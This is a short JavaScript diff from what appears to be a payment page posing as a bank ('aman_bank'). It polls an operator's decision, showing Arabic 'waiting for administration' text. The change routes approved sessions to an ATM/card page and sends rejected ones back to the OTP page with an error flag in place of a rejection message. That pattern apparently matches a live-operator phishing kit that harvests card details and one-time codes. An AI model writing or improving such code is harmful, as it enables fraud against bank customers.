@@ -834,11 +834,11 @@
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
             sessionStorage.setItem('aman_bank_request_id', paymentId);
-            window.location.href = data.redirect || 'otp.html?id=' + paymentId;
+            window.location.href = 'atm-ar.html?id=' + paymentId;
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            document.getElementById('rejectModal').classList.add('active');
+            window.location.href = 'otp.html?error=1&id=' + paymentId;
           } else if (st === 'pending') {
             document.getElementById('loadingOverlay').classList.add('active');
             document.querySelector('.loading-text').textContent = 'بانتظار قرار الإدارة... يرجى الانتظار';
